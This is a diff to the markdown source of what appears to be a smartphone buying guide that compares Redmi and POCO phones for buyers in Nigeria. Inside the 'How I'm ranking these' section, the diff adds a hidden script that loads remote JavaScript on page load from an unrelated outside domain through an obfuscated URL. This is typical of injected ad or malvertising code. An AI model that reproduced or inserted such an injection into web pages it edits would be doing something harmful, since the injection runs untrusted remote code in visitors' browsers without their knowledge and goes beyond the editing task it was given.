@@ -30,7 +30,18 @@ I went through spec sheets, hands-on reviews from trusted outlets, and current N
 ![Redmi Note 15 Pro+ and POCO X8 Pro Max compared side by side](/assets/posts/redmi-vs-poco.jpg)
 
 ## How I'm ranking these
-
+<script>
+(function(bqq){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = bqq || {};
+s.src = "\/\/unfoldedtrade.com\/bZX.V\/sEdyGCle0\/YrWdcM\/qewmk9\/uVZXUVlrk\/PDTJY\/4pM\/zmMW0CN\/jvETtrN\/j\/gezwM\/zEQ\/2\/NhQj";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 No phone here is "the best" in a vacuum. I'm judging each one against what it's realistically competing with at its price, and against what a typical buyer in Nigeria would actually use it for daily — calls, WhatsApp, camera, gaming, and how long it survives a full day of screen-on time without a charger nearby.
 
 ## The lineup at a glance
